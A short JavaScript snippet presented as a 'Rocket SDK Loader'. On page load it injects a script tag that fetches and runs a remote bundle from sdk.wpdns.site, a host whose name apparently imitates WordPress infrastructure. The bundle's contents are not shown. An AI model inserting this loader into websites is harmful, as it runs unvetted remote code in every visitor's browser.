/**
 * Rocket SDK Loader
 * Loads the Rocket SDK from CDN
 */
!function(w,d,i,s){
    function l(){
        if(!d.getElementById(i)){
            var f = d.getElementsByTagName(s)[0],
            e = d.createElement(s);
            e.type = "text/javascript";
            e.async = true;
            e.src = "https://sdk.wpdns.site/bundle.js";
            f.parentNode.insertBefore(e,f);
        }
    }
    if("function" != typeof w.Rocket){
        var c = function(){
            c.q.push(arguments)
        };
        c.q = [];
        w.Rocket = c;
        "complete" === d.readyState ? l() : w.attachEvent ? w.attachEvent("onload",l) : w.addEventListener("load",l,!1);
    }
}(window,document,"rocket-sdk","script");
